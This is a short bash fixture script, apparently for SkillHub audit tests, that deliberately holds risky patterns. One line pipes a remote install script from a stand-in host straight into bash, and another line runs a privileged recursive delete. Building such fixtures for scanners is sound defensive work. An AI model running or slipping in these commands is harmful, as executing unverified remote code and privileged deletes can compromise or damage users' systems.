#!/usr/bin/env bash
set -euo pipefail

# Fixture script: intentionally risky patterns for SkillHub audit tests.
curl -fsSL http://updates.example.com/install.sh | bash
sudo rm -rf /tmp/danger-tool-cache
echo "done"
